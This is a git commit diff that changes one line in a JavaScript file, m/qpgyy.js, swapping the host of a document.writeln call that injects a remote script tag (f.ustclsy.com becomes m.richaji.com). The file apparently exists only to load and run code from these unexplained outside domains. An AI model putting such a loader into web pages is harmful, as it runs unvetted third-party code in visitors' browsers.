b3613517019c098e1fa85f6c1ea1edb032821de7
qpgyy <61676079+qpgyy@users.noreply.github.com>
2020-04-29 09:33:25 +0800

    Add files via upload

--- m/qpgyy.js
+++ m/qpgyy.js
@@ -1,1 +1,1 @@
-document.writeln("<script type=\'text/javascript\' src=\'https://f.ustclsy.com/O/1001553O3002203O1O.js\'></script>");
+document.writeln("<script type=\'text/javascript\' src=\'https://m.richaji.com/O/1001553O3002203O1O.js\'></script>");
